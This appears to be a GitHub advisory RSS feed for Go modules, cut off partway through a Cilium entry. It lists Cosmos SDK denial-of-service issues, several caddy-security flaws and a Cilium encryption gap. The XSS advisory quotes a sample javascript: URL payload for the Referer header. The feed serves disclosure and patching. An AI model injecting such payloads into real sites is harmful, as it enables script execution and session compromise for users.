<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-02-21T04:01:14.819Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] ASA-2024-002: Default `PrepareProposalHandler` may produce invalid proposals when used with default `SenderNonceMempool`]]></title>
        <id>https://github.com/advisories/GHSA-2557-x9mg-76w8</id>
        <link href="https://github.com/advisories/GHSA-2557-x9mg-76w8"/>
        <updated>2024-02-21T00:13:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="asa-2024-002-default-prepareproposalhandler-may-produce-invalid-proposals-when-used-with-default-sendernoncemempool">ASA-2024-002: Default <code>PrepareProposalHandler</code> may produce invalid proposals when used with default <code>SenderNonceMempool</code></h2>
<p><strong>Component</strong>: Cosmos SDK
<strong>Criticality</strong>: Medium
<strong>Affected</strong> Versions: Cosmos SDK versions &lt;= 0.50.3; &lt;= 0.47.8
<strong>Affected</strong> Users: Chain developers, Validator and Node operators
<strong>Impact</strong>: Denial of Service</p>
<h2 id="summary">Summary</h2>
<p>When using the default <code>PrepareProposalHandler</code> and the default <code>SenderNonceMempool</code>, an issue was identified which may allow invalid blocks to be proposed when a single sender includes multiple transactions with non-sequential sequence numbers in certain conditions. If this state is reached, it can lead to a reduction in block production for a network.</p>
<h2 id="next-steps-for-impacted-parties">Next Steps for Impacted Parties</h2>
<p>If you are a chain developer on an affected version of the Cosmos SDK, it is advised to update to the latest available version of the Cosmos SDK for your project.  Once a patched version is available, it is recommended that network operators upgrade.</p>
<p>A Github Security Advisory for this issue is available in the Cosmos-SDK <a href="https://github.com/cosmos/cosmos-sdk/security/advisories">repository</a>. For more information about Cosmos SDK, see <a href="https://docs.cosmos.network/">https://docs.cosmos.network/</a>.</p>
<p>This issue was found by <a href="https://github.com/KonradStaniec">KonradStaniec</a>, <a href="https://github.com/gitferry">gitferry</a>, <a href="https://github.com/SebastianElvis">SebastianElvis</a>, and <a href="https://github.com/vitsalis">vitsalis</a> who reported it to the Cosmos Bug Bounty Program on HackerOne on January 16, 2024. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-2557-x9mg-76w8">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-2557-x9mg-76w8</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.9">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.9</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.4">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.4</a></li>
<li><a href="https://github.com/advisories/GHSA-2557-x9mg-76w8">https://github.com/advisories/GHSA-2557-x9mg-76w8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2557-x9mg-76w8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-21T00:13:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] ASA-2024-002: Default `PrepareProposalHandler` may produce invalid proposals when used with default `SenderNonceMempool`]]></title>
        <id>https://github.com/advisories/GHSA-2557-x9mg-76w8</id>
        <link href="https://github.com/advisories/GHSA-2557-x9mg-76w8"/>
        <updated>2024-02-21T00:13:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="asa-2024-002-default-prepareproposalhandler-may-produce-invalid-proposals-when-used-with-default-sendernoncemempool">ASA-2024-002: Default <code>PrepareProposalHandler</code> may produce invalid proposals when used with default <code>SenderNonceMempool</code></h2>
<p><strong>Component</strong>: Cosmos SDK
<strong>Criticality</strong>: Medium
<strong>Affected</strong> Versions: Cosmos SDK versions &lt;= 0.50.3; &lt;= 0.47.8
<strong>Affected</strong> Users: Chain developers, Validator and Node operators
<strong>Impact</strong>: Denial of Service</p>
<h2 id="summary">Summary</h2>
<p>When using the default <code>PrepareProposalHandler</code> and the default <code>SenderNonceMempool</code>, an issue was identified which may allow invalid blocks to be proposed when a single sender includes multiple transactions with non-sequential sequence numbers in certain conditions. If this state is reached, it can lead to a reduction in block production for a network.</p>
<h2 id="next-steps-for-impacted-parties">Next Steps for Impacted Parties</h2>
<p>If you are a chain developer on an affected version of the Cosmos SDK, it is advised to update to the latest available version of the Cosmos SDK for your project.  Once a patched version is available, it is recommended that network operators upgrade.</p>
<p>A Github Security Advisory for this issue is available in the Cosmos-SDK <a href="https://github.com/cosmos/cosmos-sdk/security/advisories">repository</a>. For more information about Cosmos SDK, see <a href="https://docs.cosmos.network/">https://docs.cosmos.network/</a>.</p>
<p>This issue was found by <a href="https://github.com/KonradStaniec">KonradStaniec</a>, <a href="https://github.com/gitferry">gitferry</a>, <a href="https://github.com/SebastianElvis">SebastianElvis</a>, and <a href="https://github.com/vitsalis">vitsalis</a> who reported it to the Cosmos Bug Bounty Program on HackerOne on January 16, 2024. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-2557-x9mg-76w8">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-2557-x9mg-76w8</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.9">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.9</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.4">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.4</a></li>
<li><a href="https://github.com/advisories/GHSA-2557-x9mg-76w8">https://github.com/advisories/GHSA-2557-x9mg-76w8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2557-x9mg-76w8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-21T00:13:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] ASA-2024-003: Missing `BlockedAddressed` Validation in Vesting Module]]></title>
        <id>https://github.com/advisories/GHSA-4j93-fm92-rp4m</id>
        <link href="https://github.com/advisories/GHSA-4j93-fm92-rp4m"/>
        <updated>2024-02-21T00:12:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="asa-2024-003-missing-blockedaddressed-validation-in-vesting-module">ASA-2024-003: Missing <code>BlockedAddressed</code> Validation in Vesting Module</h2>
<p><strong>Component</strong>: Cosmos SDK
<strong>Criticality</strong>: Low
<strong>Affected Versions</strong>: Cosmos SDK versions &lt;= 0.50.3; &lt;= 0.47.8
<strong>Affected Users</strong>: Chain developers, Validator and Node operators
<strong>Impact</strong>: Denial of Service</p>
<h2 id="description">Description</h2>
<p>A vulnerability was identified in the <code>x/auth/vesting</code> module, which can allow a user to create a periodic vesting account on a blocked address, for example a non-initialized module account. Additional validation was added to prevent creation of a periodic vesting account in this scenario.</p>
<p>If this case is triggered, there is the potential for a chain halt if the uninitialized account in question is called by <code>GetModuleAccount</code> in <code>Begin</code>/<code>EndBlock</code> of a module. This combination of an uninitialized blocked module account is not common.  </p>
<h2 id="next-steps-for-impacted-parties">Next Steps for Impacted Parties</h2>
<p>If your chain has uninitialized blocked module accounts, it is recommended to proactively initialize them, as they are often initialized during a chain migration or during init genesis.</p>
<p>If you are a chain developer on an affected version of the Cosmos SDK, it is advised to update to the latest available version of the Cosmos SDK for your project.  Once a patched version is available, it is recommended that network operators upgrade.</p>
<p>A Github Security Advisory for this issue is available in the Cosmos-SDK <a href="https://github.com/cosmos/cosmos-sdk/security/advisories">repository</a>. For more information about Cosmos SDK, see <a href="https://docs.cosmos.network/">https://docs.cosmos.network/</a>.</p>
<p>This issue was found by <a href="https://github.com/dongsam">Dongsam</a> who reported it to the Cosmos Bug Bounty Program on HackerOne on January 30, 2024. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-4j93-fm92-rp4m">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-4j93-fm92-rp4m</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.9">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.9</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.4">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.4</a></li>
<li><a href="https://github.com/advisories/GHSA-4j93-fm92-rp4m">https://github.com/advisories/GHSA-4j93-fm92-rp4m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4j93-fm92-rp4m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-02-21T00:12:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] ASA-2024-003: Missing `BlockedAddressed` Validation in Vesting Module]]></title>
        <id>https://github.com/advisories/GHSA-4j93-fm92-rp4m</id>
        <link href="https://github.com/advisories/GHSA-4j93-fm92-rp4m"/>
        <updated>2024-02-21T00:12:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="asa-2024-003-missing-blockedaddressed-validation-in-vesting-module">ASA-2024-003: Missing <code>BlockedAddressed</code> Validation in Vesting Module</h2>
<p><strong>Component</strong>: Cosmos SDK
<strong>Criticality</strong>: Low
<strong>Affected Versions</strong>: Cosmos SDK versions &lt;= 0.50.3; &lt;= 0.47.8
<strong>Affected Users</strong>: Chain developers, Validator and Node operators
<strong>Impact</strong>: Denial of Service</p>
<h2 id="description">Description</h2>
<p>A vulnerability was identified in the <code>x/auth/vesting</code> module, which can allow a user to create a periodic vesting account on a blocked address, for example a non-initialized module account. Additional validation was added to prevent creation of a periodic vesting account in this scenario.</p>
<p>If this case is triggered, there is the potential for a chain halt if the uninitialized account in question is called by <code>GetModuleAccount</code> in <code>Begin</code>/<code>EndBlock</code> of a module. This combination of an uninitialized blocked module account is not common.  </p>
<h2 id="next-steps-for-impacted-parties">Next Steps for Impacted Parties</h2>
<p>If your chain has uninitialized blocked module accounts, it is recommended to proactively initialize them, as they are often initialized during a chain migration or during init genesis.</p>
<p>If you are a chain developer on an affected version of the Cosmos SDK, it is advised to update to the latest available version of the Cosmos SDK for your project.  Once a patched version is available, it is recommended that network operators upgrade.</p>
<p>A Github Security Advisory for this issue is available in the Cosmos-SDK <a href="https://github.com/cosmos/cosmos-sdk/security/advisories">repository</a>. For more information about Cosmos SDK, see <a href="https://docs.cosmos.network/">https://docs.cosmos.network/</a>.</p>
<p>This issue was found by <a href="https://github.com/dongsam">Dongsam</a> who reported it to the Cosmos Bug Bounty Program on HackerOne on January 30, 2024. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-4j93-fm92-rp4m">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-4j93-fm92-rp4m</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.9">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.9</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.4">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.4</a></li>
<li><a href="https://github.com/advisories/GHSA-4j93-fm92-rp4m">https://github.com/advisories/GHSA-4j93-fm92-rp4m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4j93-fm92-rp4m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-02-21T00:12:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Server-Side Request Forgery in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-93x8-66j2-wwr5</id>
        <link href="https://github.com/advisories/GHSA-93x8-66j2-wwr5"/>
        <updated>2024-02-20T23:53:07.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package github.com/greenpau/caddy-security are vulnerable to Server-side Request Forgery (SSRF) via X-Forwarded-Host header manipulation. An attacker can expose sensitive information, interact with internal services, or exploit other vulnerabilities within the network by exploiting this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21498">https://nvd.nist.gov/vuln/detail/CVE-2024-21498</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/269">https://github.com/greenpau/caddy-security/issues/269</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249862">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249862</a></li>
<li><a href="https://github.com/advisories/GHSA-93x8-66j2-wwr5">https://github.com/advisories/GHSA-93x8-66j2-wwr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93x8-66j2-wwr5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Improper Restriction of Excessive Authentication Attempts in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-vfph-hjfv-cpv2</id>
        <link href="https://github.com/advisories/GHSA-vfph-hjfv-cpv2"/>
        <updated>2024-02-20T23:48:23.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package github.com/greenpau/caddy-security are vulnerable to Improper Restriction of Excessive Authentication Attempts via the two-factor authentication (2FA). Although the application blocks the user after several failed attempts to provide 2FA codes, attackers can bypass this blocking mechanism by automating the application’s full multistep 2FA process.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21500">https://nvd.nist.gov/vuln/detail/CVE-2024-21500</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/271">https://github.com/greenpau/caddy-security/issues/271</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249864">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249864</a></li>
<li><a href="https://github.com/advisories/GHSA-vfph-hjfv-cpv2">https://github.com/advisories/GHSA-vfph-hjfv-cpv2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfph-hjfv-cpv2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Improper Neutralization of HTTP Headers in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-r969-783f-6jqr</id>
        <link href="https://github.com/advisories/GHSA-r969-783f-6jqr"/>
        <updated>2024-02-20T23:48:05.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package github.com/greenpau/caddy-security are vulnerable to HTTP Header Injection via the X-Forwarded-Proto header due to redirecting to the injected protocol.Exploiting this vulnerability could lead to bypass of security mechanisms or confusion in handling TLS.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21499">https://nvd.nist.gov/vuln/detail/CVE-2024-21499</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/270">https://github.com/greenpau/caddy-security/issues/270</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249863">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249863</a></li>
<li><a href="https://github.com/advisories/GHSA-r969-783f-6jqr">https://github.com/advisories/GHSA-r969-783f-6jqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r969-783f-6jqr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Insufficient Session Expiration in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-vp66-gf7w-9m4x</id>
        <link href="https://github.com/advisories/GHSA-vp66-gf7w-9m4x"/>
        <updated>2024-02-20T23:47:50.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package github.com/greenpau/caddy-security are vulnerable to Insufficient Session Expiration due to improper user session invalidation upon clicking the "Sign Out" button. User sessions remain valid even after requests are sent to /logout and /oauth2/google/logout. Attackers who gain access to an active but supposedly logged-out session can perform unauthorized actions on behalf of the user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21492">https://nvd.nist.gov/vuln/detail/CVE-2024-21492</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/272">https://github.com/greenpau/caddy-security/issues/272</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-5920787">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-5920787</a></li>
<li><a href="https://github.com/advisories/GHSA-vp66-gf7w-9m4x">https://github.com/advisories/GHSA-vp66-gf7w-9m4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vp66-gf7w-9m4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Open Redirect in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-8hp3-rmr7-xh88</id>
        <link href="https://github.com/advisories/GHSA-8hp3-rmr7-xh88"/>
        <updated>2024-02-20T23:47:36.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package github.com/greenpau/caddy-security are vulnerable to Open Redirect via the redirect_url parameter. An attacker could perform a phishing attack and trick users into visiting a malicious website by crafting a convincing URL with this parameter. To exploit this vulnerability, the user must take an action, such as clicking on a portal button or using the browser’s back button, to trigger the redirection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21497">https://nvd.nist.gov/vuln/detail/CVE-2024-21497</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/268">https://github.com/greenpau/caddy-security/issues/268</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249861">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249861</a></li>
<li><a href="https://github.com/advisories/GHSA-8hp3-rmr7-xh88">https://github.com/advisories/GHSA-8hp3-rmr7-xh88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8hp3-rmr7-xh88</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Improper Validation of Array Index in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-8h95-jcp5-pjpr</id>
        <link href="https://github.com/advisories/GHSA-8h95-jcp5-pjpr"/>
        <updated>2024-02-20T23:47:21.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package github.com/greenpau/caddy-security are vulnerable to Improper Validation of Array Index when parsing a Caddyfile. Multiple parsing functions in the affected library do not validate whether their input values are nil before attempting to access elements, which can lead to a panic (index out of range). Panics during the parsing of a configuration file may introduce ambiguity and vulnerabilities, hindering the correct interpretation and configuration of the web server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21493">https://nvd.nist.gov/vuln/detail/CVE-2024-21493</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/263">https://github.com/greenpau/caddy-security/issues/263</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-5961078">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-5961078</a></li>
<li><a href="https://github.com/advisories/GHSA-8h95-jcp5-pjpr">https://github.com/advisories/GHSA-8h95-jcp5-pjpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8h95-jcp5-pjpr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Cross-site Scripting in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-ff72-ff42-c3gw</id>
        <link href="https://github.com/advisories/GHSA-ff72-ff42-c3gw"/>
        <updated>2024-02-20T23:46:52.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package github.com/greenpau/caddy-security are vulnerable to Cross-site Scripting (XSS) via the Referer header, due to improper input sanitization. Although the Referer header is sanitized by escaping some characters that can allow XSS (e.g., [&amp;], [&lt;], [&gt;], ["], [']), it does not account for the attack based on the JavaScript URL scheme (e.g., javascript:alert(document.domain)// payload). Exploiting this vulnerability may not be trivial, but it could lead to the execution of malicious scripts in the context of the target user’s browser, compromising user sessions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21496">https://nvd.nist.gov/vuln/detail/CVE-2024-21496</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/267">https://github.com/greenpau/caddy-security/issues/267</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249860">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249860</a></li>
<li><a href="https://github.com/advisories/GHSA-ff72-ff42-c3gw">https://github.com/advisories/GHSA-ff72-ff42-c3gw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ff72-ff42-c3gw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Authentication Bypass by Spoofing in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-vj36-3ccr-6563</id>
        <link href="https://github.com/advisories/GHSA-vj36-3ccr-6563"/>
        <updated>2024-02-20T23:46:29.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package github.com/greenpau/caddy-security are vulnerable to Authentication Bypass by Spoofing via the X-Forwarded-For header due to improper input sanitization. An attacker can spoof an IP address used in the user identity module (/whoami API endpoint). This could lead to unauthorized access if the system trusts this spoofed IP address.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21494">https://nvd.nist.gov/vuln/detail/CVE-2024-21494</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/266">https://github.com/greenpau/caddy-security/issues/266</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249859">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6249859</a></li>
<li><a href="https://github.com/advisories/GHSA-vj36-3ccr-6563">https://github.com/advisories/GHSA-vj36-3ccr-6563</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vj36-3ccr-6563</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/greenpau/caddy-security] Use of Insufficiently Random Values in github.com/greenpau/caddy-security]]></title>
        <id>https://github.com/advisories/GHSA-c7vf-m394-m4x4</id>
        <link href="https://github.com/advisories/GHSA-c7vf-m394-m4x4"/>
        <updated>2024-02-20T23:45:45.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package github.com/greenpau/caddy-security before 1.0.42 are vulnerable to Insecure Randomness due to using an insecure random number generation library which could possibly be predicted via a brute-force search. Attackers could use the potentially predictable nonce value used for authentication purposes in the OAuth flow to conduct OAuth replay attacks. In addition, insecure randomness is used while generating multifactor authentication (MFA) secrets and creating API keys in the database package.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21495">https://nvd.nist.gov/vuln/detail/CVE-2024-21495</a></li>
<li><a href="https://github.com/greenpau/caddy-security/issues/265">https://github.com/greenpau/caddy-security/issues/265</a></li>
<li><a href="https://github.com/greenpau/go-authcrunch/commit/ecd3725baf2683eb1519bb3c81ae41085fbf7dc2">https://github.com/greenpau/go-authcrunch/commit/ecd3725baf2683eb1519bb3c81ae41085fbf7dc2</a></li>
<li><a href="https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy">https://blog.trailofbits.com/2023/09/18/security-flaws-in-an-sso-plugin-for-caddy</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6248275">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGREENPAUCADDYSECURITY-6248275</a></li>
<li><a href="https://github.com/advisories/GHSA-c7vf-m394-m4x4">https://github.com/advisories/GHSA-c7vf-m394-m4x4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c7vf-m394-m4x4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-17T06:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Unencrypted traffic between pods when using Wireguard and an external kvstore]]></title>
        <id>https://github.com/advisories/GHSA-x989-52fc-4vr4</id>
        <link href="https://github.com/advisories/GHSA-x989-52fc-4vr4"/>
        <updated>2024-02-20T23:45:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>For Cilium users who have enabled <a href="https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore">an external kvstore</a> and <a href="https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg">Wireguard transparent encryption</a>, traffic between pods in the affected cluster is not encrypted.</p>
<h3 id="patches">Patches</h3>
<p>This issue affects Cilium v1.14 before v1.14.7.</p>
<p>This issue has been patched in Cilium v1.14.7.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue - affected users are encouraged to upgrade.</p>
